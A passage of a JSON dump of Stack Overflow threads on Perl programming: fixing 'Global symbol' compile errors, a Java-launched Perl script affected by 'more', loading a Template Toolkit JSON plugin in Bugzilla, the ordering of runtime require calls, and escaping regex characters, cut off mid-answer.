1466159989, "post_id": 37878796, "comment_id": 63213877, "body": "As I said to you yesterday, one of the most important attributes that a programmer needs is attention to detail. There is at least one of the points in <a href=\"http://stackoverflow.com/a/37861323/7231\">yesterday&#39;s answer</a> which you haven&#39;t fully addressed. <code>file::Basename</code> is not the same as <code>File::Basename</code>. I repeat my advice from yesterday - take more care."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1466158667, "creation_date": 1466158667, "answer_id": 37878993, "question_id": 37878796, "link": "https://stackoverflow.com/questions/37878796/perl-code-error-global-symbol-requires-explicit-package-name/37878993#37878993", "title": "Perl Code Error: Global Symbol Requires explicit package name", "body": "<p>You seem to have skipped an awful lot of code where issues may be hidden</p>\n\n<p>In what you <em>have</em> shown</p>\n\n<ul>\n<li><p>You haven't declared <code>$String</code>, which should really be <code>$string</code></p></li>\n<li><p><code>file::BaseName</code> is really called <code>File::Basename</code>, and <code>file::Copy</code> is spelled <code>File::Copy</code></p></li>\n<li><p><code>#!usr/bin/perl</code> should be <code>#!/usr/bin/perl</code></p></li>\n<li><p><code>@fields</code> should be declared where it is first used, not at the outer level of the file</p></li>\n</ul>\n\n<p>However, because there is so much missing these may not be the source of your error</p>\n\n<p>Try rewriting this part of your code like so</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse File::Basename;\nuse File::Copy;\n\n# my array declaration\nmy @fields;\n\n# my other declarations\n# input and output file initialization\n\nwhile ( &lt;DATA1&gt; ) {\n\n    my $string = $_;\n\n    @fields = split /,/, $string;\n\n    foreach my $elements ( @fields ) {\n        # Some code\n    }\n\n    # REST OF THE CODE\n\n}\n\nclose DATA1;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1466159029, "post_id": 37879093, "comment_id": 63213165, "body": "<i>&quot;you should use DATA instead of DATA1&quot;</i> Not necessarily, if <code>DATA1</code> has been opened in the invisible parts of the program"}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466160885, "post_id": 37879093, "comment_id": 63214452, "body": "True, but <a href=\"http://perldoc.perl.org/perldata.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/perldata.html</a> says that perl will know how to read the <code>__DATA__</code> section.  Any other section will require opening specially.  If using multiple data blocks, you should consider using <code>Inline::Files</code> <a href=\"http://search.cpan.org/~ambs/Inline-Files-0.69/lib/Inline/Files.pm\" rel=\"nofollow noreferrer\">search.cpan.org/~ambs/Inline-Files-0.69/lib/Inline/Files.pm</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466163600, "post_id": 37879093, "comment_id": 63216175, "body": "I&#39;m not sure what point you&#39;re making. The OP may not have intended to use a data block at all"}], "tags": [], "owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "is_accepted": true, "score": 0, "last_activity_date": 1466159545, "last_edit_date": 1466159545, "creation_date": 1466158905, "answer_id": 37879093, "question_id": 37878796, "link": "https://stackoverflow.com/questions/37878796/perl-code-error-global-symbol-requires-explicit-package-name/37879093#37879093", "title": "Perl Code Error: Global Symbol Requires explicit package name", "body": "<p>At a bare minimum, you need to get your code to compile.  The perl compiler is usually very helpful in telling you what is wrong.  Here you have invalid package names, an invalid perl path, and you should use DATA instead of DATA1.  </p>\n\n<p>Try running your code using <code>diagnostics</code> as it is more informative:</p>\n\n<pre><code>perl -cwT -Mdiagnostics script.pl\n\nCan't locate file/BaseName.pm in @INC (you may need to install the\nfile::BaseName module) (@INC contains: /etc/perl /usr/local/lib/i386-\n... ) at foo2.pl line 4.\n\nBEGIN failed--compilation aborted at foo2.pl line 4 (#1)\n    (F) You said to do (or require, or use) a file that couldn't be found.\n    Perl looks for the file in all the locations mentioned in @INC, unless\n    the file name included the full path to the file.  Perhaps you need\n    to set the PERL5LIB or PERL5OPT environment variable to say where the\n    extra library is, or maybe the script needs to add the library name\n    to @INC.  Or maybe you just misspelled the name of the file.\n\n    See \"require\" in perlfunc and lib.\n\nUncaught exception from user code:\n    Can't locate file/BaseName.pm in @INC (you may need to install the\n    file::BaseName module) (@INC contains: /etc/perl /usr/local/lib/i386-\n    ... ) at foo2.pl line 4.\n\nBEGIN failed--compilation aborted at foo2.pl line 4.\n</code></pre>\n\n<p>Here is a compiling version of your code:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse File::Basename;\nuse File::Copy;\n\nmy @fields;\n\nwhile(&lt;DATA&gt;) {\n    my $String='';\n    $String= $_;\n    @fields= split(/,/,$String);\n    my $i = 0;\n    foreach my $element (@fields) {\n        print \"[$i] : $element\\n\";\n        $i++;\n    }\n}\n\n__DATA__\nfoo,bar,baz\nqux,1,2,3\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>[0] : foo\n[1] : bar\n[2] : baz\n\n[0] : qux\n[1] : 1\n[2] : 2\n[3] : 3\n</code></pre>\n"}], "owner": {"reputation": 65, "user_id": 5296508, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a3662aad9147ac884c90e9987d93a06?s=128&d=identicon&r=PG&f=1", "display_name": "Kajal_T", "link": "https://stackoverflow.com/users/5296508/kajal-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 547, "favorite_count": 0, "closed_date": 1466160004, "accepted_answer_id": 37879093, "answer_count": 2, "score": -3, "last_activity_date": 1466159545, "creation_date": 1466158106, "last_edit_date": 1466158517, "question_id": 37878796, "link": "https://stackoverflow.com/questions/37878796/perl-code-error-global-symbol-requires-explicit-package-name", "closed_reason": "Not suitable for this site", "title": "Perl Code Error: Global Symbol Requires explicit package name", "body": "<p>I am trying to compile this code, but it keeps getting same error for @fields and $element variable. As far as I can tell it is not an scoping error, as it is declared globally. It gets compiled if I don't use strict.</p>\n\n<p>I have provided a prototype of code, please ignore any typing errors.</p>\n\n<pre><code>#!usr/bin/perl\nuse strict;\nuse warnings;\nuse file::BaseName;\nuse file::Copy;\n\n#my array declaration\nmy @fields;\n\n#my other declarations\n#input and output file initialization\n\nwhile(&lt;DATA1&gt;) {\n    $String='';\n    $String= $_;\n    @fields= split(/,/,$String);\n        foreach my $elements(@fields){\n             #Some code\n         }\n\n    #more code\n}\nclose (DATA1);\n</code></pre>\n"}, {"tags": ["java", "linux", "perl"], "comments": [{"owner": {"reputation": 13, "user_id": 6478423, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05d92f17a236b68ac20aa55016ed62a?s=128&d=identicon&r=PG&f=1", "display_name": "Qi Wang", "link": "https://stackoverflow.com/users/6478423/qi-wang"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466157277, "post_id": 37878058, "comment_id": 63212008, "body": "Thank you very very very much !  That is the reason ! I have been confused by this for whole day! I Accept my great admiration and worship !"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466157840, "post_id": 37878058, "comment_id": 63212414, "body": "You&#39;re welcome. I made an answer of my comment."}], "answers": [{"tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": true, "score": 1, "last_activity_date": 1466157781, "creation_date": 1466157781, "answer_id": 37878679, "question_id": 37878058, "link": "https://stackoverflow.com/questions/37878058/java-call-perl-which-read-and-write-data/37878679#37878679", "title": "java call perl which read and write data", "body": "<p><code>more</code> is the guilty one here. It's intended for looking at a file one page at a time and waits for hitting e.g. <kbd>SPACE</kbd> to show the next page. Try <code>cat</code> instead of <code>more</code> to see if that is the reason.</p>\n\n<p><code>more</code> tries to be smart and autodetect whether it was called in an interactive situation but sometimes it fails. Depending on its settings it might behave as <code>cat</code> then, but you cannot be sure...</p>\n"}], "owner": {"reputation": 13, "user_id": 6478423, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05d92f17a236b68ac20aa55016ed62a?s=128&d=identicon&r=PG&f=1", "display_name": "Qi Wang", "link": "https://stackoverflow.com/users/6478423/qi-wang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 37878679, "answer_count": 1, "score": 1, "last_activity_date": 1466157781, "creation_date": 1466155982, "last_edit_date": 1466156715, "question_id": 37878058, "link": "https://stackoverflow.com/questions/37878058/java-call-perl-which-read-and-write-data", "title": "java call perl which read and write data", "body": "<p>I have two files int the directory '/tmp': test.txt ,test.pl </p>\n\n<p>the content of test.txt is :</p>\n\n<pre><code>abcdefg\n</code></pre>\n\n<p>the content of the test.pl is:</p>\n\n<pre><code> #!/usr/bin/perl -w\n chdir '/tmp';\n $data = `more test.txt`;\n open (MYFILE,\"&gt;\",\"newtest.txt\") || die (\"can not open this file\");\n print  MYFILE $data;\n</code></pre>\n\n<p>Then in java class I write :</p>\n\n<pre><code>Process ps1= Runtime.getRuntime().exec(\"perl /tmp/test.pl \");\n</code></pre>\n\n<p>Then the content of the newtest.txt generated from the perl is :</p>\n\n<pre><code>::::::::::: \ntest.txt \n:::::::::::\nabcdefg\n</code></pre>\n\n<p>Here is the problem ,There is a difference </p>\n\n<pre><code>:::::::\ntest.txt\n:::::::\n</code></pre>\n\n<p>but when I run 'perl test.pl' in linux , there is no difference between two files.</p>\n\n<p>anyone knows the reason ? Thanks !</p>\n"}, {"tags": ["json", "perl", "bugzilla", "template-toolkit"], "comments": [{"owner": {"reputation": 1316, "user_id": 1397617, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9964febee0003c7bec6ed7d6ea2c1773?s=128&d=identicon&r=PG", "display_name": "N. Chamaa", "link": "https://stackoverflow.com/users/1397617/n-chamaa"}, "edited": false, "score": 0, "creation_date": 1466155920, "post_id": 37877924, "comment_id": 63211117, "body": "version of Bugzilla is 5x"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1466160232, "post_id": 37877924, "comment_id": 63214036, "body": "Do you have that plugin module installed?"}, {"owner": {"reputation": 1316, "user_id": 1397617, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9964febee0003c7bec6ed7d6ea2c1773?s=128&d=identicon&r=PG", "display_name": "N. Chamaa", "link": "https://stackoverflow.com/users/1397617/n-chamaa"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466167145, "post_id": 37877924, "comment_id": 63218513, "body": "I think yes , after doing ./checksetup.pl  I got a list of plugins, and the JSON XS is in                       Checking for              JSON-XS (v2.01)     ok: found v3.02"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1466167352, "post_id": 37877924, "comment_id": 63218643, "body": "That sounds like you have the module <i>JSON</i> (or <i>JSON::XS</i>) installed. That&#39;s not the same as your <i>Template::Plugin::JSON</i>. See <a href=\"http://stackoverflow.com/a/3736710/1331451\">stackoverflow.com/a/3736710/1331451</a> for how to install it. The easiest way will be <code>cpan Template::Plugin::JSON</code> or <code>cpanm Template::Plugin::JSON</code> on the command line of the host that&#39;s runing the Bugzilla installation."}, {"owner": {"reputation": 1316, "user_id": 1397617, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9964febee0003c7bec6ed7d6ea2c1773?s=128&d=identicon&r=PG", "display_name": "N. Chamaa", "link": "https://stackoverflow.com/users/1397617/n-chamaa"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466167446, "post_id": 37877924, "comment_id": 63218688, "body": "Are they the same plugin JSON and JSON-XS, when I did [% USE JSON-XS %]  and error with  unexpected token (-) [% USE JSON-XS %]"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466167639, "post_id": 37877924, "comment_id": 63218801, "body": "You have to use <code>::</code> (two colons). The <code>-</code> minus is just used in distribution names. In code, you need the <code>::</code>. There is no JSON::XS plugin for Template Toolkit. In general, the <i>::XS</i> says that it&#39;s not written in Perl, but rather it uses a C library that is connected to Perl to speed things up."}, {"owner": {"reputation": 1316, "user_id": 1397617, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9964febee0003c7bec6ed7d6ea2c1773?s=128&d=identicon&r=PG", "display_name": "N. Chamaa", "link": "https://stackoverflow.com/users/1397617/n-chamaa"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466167843, "post_id": 37877924, "comment_id": 63218949, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/114946/discussion-between-zico-and-simbabque\">continue this discussion in chat</a>."}], "owner": {"reputation": 1316, "user_id": 1397617, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9964febee0003c7bec6ed7d6ea2c1773?s=128&d=identicon&r=PG", "display_name": "N. Chamaa", "link": "https://stackoverflow.com/users/1397617/n-chamaa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 100, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1466160270, "creation_date": 1466155665, "last_edit_date": 1466160270, "question_id": 37877924, "link": "https://stackoverflow.com/questions/37877924/decode-json-in-bugzilla-template", "title": "Decode json in bugzilla template?", "body": "<p>How to decode Json in Bugzilla template ?</p>\n\n<p>how can I load the <a href=\"http://search.cpan.org/~neilb/Template-Plugin-JSON-0.07/lib/Template/Plugin/JSON.pm\" rel=\"nofollow\">JSON Plugin</a> correctly?</p>\n\n<pre><code>    [% USE JSON ( pretty =&gt; 1 ) %];\n\n    &lt;script type=\"text/javascript\"&gt;\n\n            var foo = [% foo.json %];\n\n    &lt;/script&gt;\n\n    or read in JSON\n\n    [% USE JSON %]\n    [% data = JSON.json_decode(json) %]\n    [% data.thing %]\n</code></pre>\n\n<p>it's giving me an error that <code>plugin error - JSON: plugin not found</code></p>\n"}, {"tags": ["perl", "perl-module"], "comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1466157146, "post_id": 37877812, "comment_id": 63211933, "body": "Try <code>my @Hosts=main::getHosts();</code> instead of <code>my @Hosts=getHosts();</code>. Btw. it&#39;s not the very best practice to abuse *.pl as *.pm. Better would be to move <code>getHosts()</code> to a separate module and let all others <code>use</code> that."}, {"owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466157639, "post_id": 37877812, "comment_id": 63212274, "body": "my @Hosts=main::getHosts();   still i get same error..   Undefined subroutine &amp;main::getHosts"}, {"owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466157728, "post_id": 37877812, "comment_id": 63212322, "body": "if i use the same subroutine in test1.pm it was working fine."}, {"owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466157834, "post_id": 37877812, "comment_id": 63212409, "body": "Also if i comment out  the  calling of &quot;test1&quot; perl module in the master perl  script (use Modules::test1;)   then it works for test2.pm"}, {"owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466157920, "post_id": 37877812, "comment_id": 63212457, "body": "only for the first perl module, it was working.. I was able to call and any subroutines present in the &quot;/tmp/utils/Utili.pl&quot;"}, {"owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466158211, "post_id": 37877812, "comment_id": 63212630, "body": "iam using  below lines in every perl modules to acces the subroutines.                                    require &quot;/tmp/utils/Log.pl&quot;; require &quot;/tmp/utils/Utili.pl&quot;;"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1466166817, "post_id": 37877812, "comment_id": 63218303, "body": "<code>require</code> happens at runtime, so in test2, when you call <code>getIP()</code>, it has not yet loaded that sub from the Utili.pl file. Try moving the <code>require</code> statements above the call to the sub."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1466166844, "post_id": 37877812, "comment_id": 63218324, "body": "example: <code>perl -E &#39;say 5; say require Data::Dumper;&#39;</code>"}, {"owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "edited": false, "score": 0, "creation_date": 1466323788, "post_id": 37877812, "comment_id": 63262865, "body": "sorry, i have corrected that but forgot to update here.. still iam not able to acces the subtoutines in test2.pm"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "edited": false, "score": 0, "creation_date": 1466324176, "post_id": 37881788, "comment_id": 63262964, "body": "sorry, i have corrected that but forgot to update here.. still iam not able to acces the subroutines in test2.pm"}, {"owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "edited": false, "score": 0, "creation_date": 1466324195, "post_id": 37881788, "comment_id": 63262967, "body": "Also if i comment out the calling of &quot;test1&quot; perl module in the master perl script (use Modules::test1;) then it works for test2.pm"}, {"owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "edited": false, "score": 0, "creation_date": 1466404891, "post_id": 37881788, "comment_id": 63283110, "body": "any suggestions on this please.. ??"}], "tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": false, "score": 1, "last_activity_date": 1466167053, "creation_date": 1466167053, "answer_id": 37881788, "question_id": 37877812, "link": "https://stackoverflow.com/questions/37877812/how-to-use-subroutines-in-perl-modules-which-are-present-in-perl-scripts/37881788#37881788", "title": "How to use subroutines in perl modules, which are present in perl scripts", "body": "<p><code>require</code> happens at runtime, so in this code:</p>\n\n<pre><code>my @IP=getIP();\n\nrequire \"/tmp/utils/Log.pl\";\nrequire \"/tmp/utils/Utili.pl\";\n</code></pre>\n\n<p><code>getIP()</code> has not yet been loaded from the <code>Utili.pl</code> file, so it's looking in it's own scope for that sub. Move things around so that the subs get loaded before you call them:</p>\n\n<pre><code>require \"/tmp/utils/Log.pl\";\nrequire \"/tmp/utils/Utili.pl\";\n\nmy @IP=getIP();\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 4411543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b72e648768c3ea5cbc06d246d61f4c9d?s=128&d=identicon&r=PG&f=1", "display_name": "Srikanth", "link": "https://stackoverflow.com/users/4411543/srikanth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 553, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1466167053, "creation_date": 1466155381, "last_edit_date": 1466156796, "question_id": 37877812, "link": "https://stackoverflow.com/questions/37877812/how-to-use-subroutines-in-perl-modules-which-are-present-in-perl-scripts", "title": "How to use subroutines in perl modules, which are present in perl scripts", "body": "<p>I need help in accessing the subroutines present in the perl scripts in perl modules.</p>\n\n<p><strong>getHosts()</strong> and <strong>getIP()</strong> subroutines are present in /tmp/utils/Utili.pl (perl script).</p>\n\n<p>when I compile that master.pl,  I am getting <strong>Undefined subroutine &amp;Modules::test2::getIP called at /tmp/Modules/test2.pm</strong></p>\n\n<p><strong>getIP()</strong> subroutine was present in the <strong>/tmp/utils/Utili.pl</strong> perl script.</p>\n\n<p>I cannot take risk of changing <strong>/tmp/utils/Utili.pl</strong> to perl module, since it was used in hundreds of scripts and requires lot of testing effort.</p>\n\n<p>could some one help me on this.?</p>\n\n<p>Also, its not only this subroutine, whatever subroutines which were present in the /tmp/utils/Utili.pl perl script if i call in test2.pm iam getting the same error. the same subroutines are working if i call in test1.pm in both the modules, iam using the below lines to access the subroutines.</p>\n\n<pre><code>require \"/tmp/utils/Log.pl\";\nrequire \"/tmp/utils/Utili.pl\";\n</code></pre>\n\n<p>please find the sudo code below.</p>\n\n<p>Example:</p>\n\n<p><strong>master script: master.pl</strong></p>\n\n<p>in master.pl iam calling new subroutine in perl modules \"test1.pm\" and \"test2.pm\" as below.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse lib \"/tmp\";\n\nuse Modules::test1;\nuse Modules::test2;\n\nmy $installation1 = Modules::test1-&gt;new();\n\nmy $installation2 = Modules::test2-&gt;new();\n</code></pre>\n\n<p>[download]\ntest1.pm:</p>\n\n<p>in \"test1.pm\" i have the below code,</p>\n\n<pre><code>package Modules::test1;\n\nuse strict;\nuse warnings;\n\nrequire \"/tmp/utils/Log.pl\";\nrequire \"/tmp/utils/Utili.pl\";\n\nmy @Hosts=getHosts();\n\nsub new()\n\n{\n\nprint \"inside new\\n\";\n\n}\n</code></pre>\n\n<p>[download]\ntest2.pm</p>\n\n<p>in \"test2.pm\" i have the below code,</p>\n\n<pre><code>package Modules::test2;\n\nuse strict;\nuse warnings;\n\nmy @IP=getIP();\n\nrequire \"/tmp/utils/Log.pl\";\nrequire \"/tmp/utils/Utili.pl\";\n\nsub new()\n{\n\nprint \"inside new\\n\";\n\n}\n</code></pre>\n"}, {"tags": ["arrays", "regex", "perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1466114924, "post_id": 37870091, "comment_id": 63197056, "body": "How do you want to match a regex against an array? Your example seems to suggest you don&#39;t want to match each element, but somehow groups of neighbouring elements. What&#39;s the expected output of <code>grep &#47;$string&#47;, @array</code>?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5240420"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1466117076, "post_id": 37870091, "comment_id": 63197781, "body": "Yes, I want to match a dollar sign as a dollar, not a regular expression character"}], "answers": [{"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 1, "last_activity_date": 1578038224, "last_edit_date": 1578038224, "creation_date": 1466117995, "answer_id": 37870717, "question_id": 37870091, "link": "https://stackoverflow.com/questions/37870091/how-to-escape-perl-regular-expression-characters-in-array-and-in-grep/37870717#37870717", "title": "How to escape Perl regular expression characters in array and in grep?", "body": "<p>The strings to search for a match don't need special care or escaping, apart from suitable quoting. The matching patterns need be escaped if they are to match 